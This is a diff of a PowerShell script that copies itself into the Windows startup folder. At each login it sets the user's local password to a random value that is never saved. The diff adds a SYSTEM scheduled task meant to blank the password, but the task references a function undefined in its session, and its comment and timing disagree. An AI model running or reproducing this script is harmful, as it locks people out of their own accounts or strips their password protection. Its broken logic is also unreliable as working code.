@@ -8,7 +8,7 @@ $scriptPath = "$startupFolder\PasswordChangeScript.ps1"
 if (-not (Test-Path $scriptPath)) {
     # If not present, copy the script to the startup folder
     $scriptContent = @"
-# Define the function to generate a random password
+# Function to generate a random password
 function Generate-RandomPassword {
     $chars = [char[]]('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()')
     $password = ''
@@ -18,21 +18,25 @@ function Generate-RandomPassword {
     return $password
 }
 
-# Function to change user password
-function Change-UserPassword {
-    param (
-        [string]$newPassword
-    )
+# Function to set the user password to blank
+function Reset-UserPassword {
     $username = $env:USERNAME
-    $securePassword = ConvertTo-SecureString -String $newPassword -AsPlainText -Force
-    Set-LocalUser -Name $username -Password $securePassword
+    $nullPassword = ConvertTo-SecureString """" -AsPlainText -Force
+    Set-LocalUser -Name $username -Password $nullPassword
 }
 
 # Generate a new random password
 $newPassword = Generate-RandomPassword
 
-# Change user password
-Change-UserPassword -newPassword $newPassword
+# Set the user password to the new random password
+$securePassword = ConvertTo-SecureString -String $newPassword -AsPlainText -Force
+Set-LocalUser -Name $env:USERNAME -Password $securePassword
+
+# Schedule a task to reset password to blank after 1 second
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"Start-Sleep -Seconds 1; Reset-UserPassword`""
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
+Register-ScheduledTask -TaskName "ResetPassword" -Action $action -Trigger $trigger -User "SYSTEM"
+
 "@
 
     # Create the script file
